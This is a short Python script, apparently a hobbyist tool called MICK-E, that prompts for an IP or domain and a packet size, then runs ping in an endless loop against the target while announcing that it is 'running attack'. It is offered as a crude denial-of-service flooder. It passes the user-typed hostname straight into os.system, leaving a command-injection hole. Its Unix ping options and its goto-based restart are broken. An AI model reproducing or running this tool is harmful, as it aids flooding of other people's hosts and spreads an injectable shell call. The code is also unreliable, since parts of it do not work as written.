import os
import keyboard
import colored
from goto_py import goto
from colorama import init, Fore, Back, Style
import time
import getpass
def cls():
    os.system('cls' if os.name=='nt' else 'clear')
Link=f"\n   {Back.WHITE}{Fore.BLACK}Download the program at https://github.com/variouz/MICK-E{Style.RESET_ALL}"
logoLine="   _______________________________________________________________________"
startPoint=f"""

             {Fore.CYAN}.-```-.
            {Fore.CYAN}/       \      {Fore.WHITE} \   | _ _|  ___| |  /        ____|
            {Fore.CYAN}\       /      {Fore.WHITE} |\/ |   |  |     | /         __|
     {Fore.CYAN}.-```-.-`.-.-.<       {Fore.WHITE} |   |   |  |     . \ _____|  |
    {Fore.CYAN}/      _,-\ ()()_/:)   {Fore.WHITE}_|  _| ___|\____|_|\_\       _____|
    {Fore.CYAN}\     / ,  `     `|
     {Fore.CYAN}'-..-| \-.,___,  /		   MADE BY VARIOUZ
           {Fore.CYAN}\ `-.__/  /
            {Fore.CYAN}`-.__.-'`{Style.RESET_ALL}
            """
Continue="\n   [Enter] Continue [Ctrl-C] Exit"
getpass.getpass("\n   Press enter to start.\n ")
cls()
print(Link)
print(logoLine)
print(startPoint)
print(logoLine)
print(Continue)
getpass.getpass("\n   ")
cls()
print(f" \n   {Fore.CYAN}Enter IP or domain name:{Style.RESET_ALL}\n")
hostname=input("   ")
cls()
print(f"\n   {Fore.CYAN}Enter the amount of bytes to attack with (over 1512B seems to break):{Style.RESET_ALL}\n")
amount=input("   ")
if amount.isnumeric():
    while 1==1:
        cls()
        print(f"\n   {Fore.CYAN}Now running attack on {hostname} with {amount} bytes...\n")
        print(Link)
        os.system(f"ping {hostname} -l {amount} -t" if os.name=="nt" else f"ping -s {amount} -c {hostname} ")

else:
    cls()
    print("\n   That was not a number. Restarting...")
    goto(1)
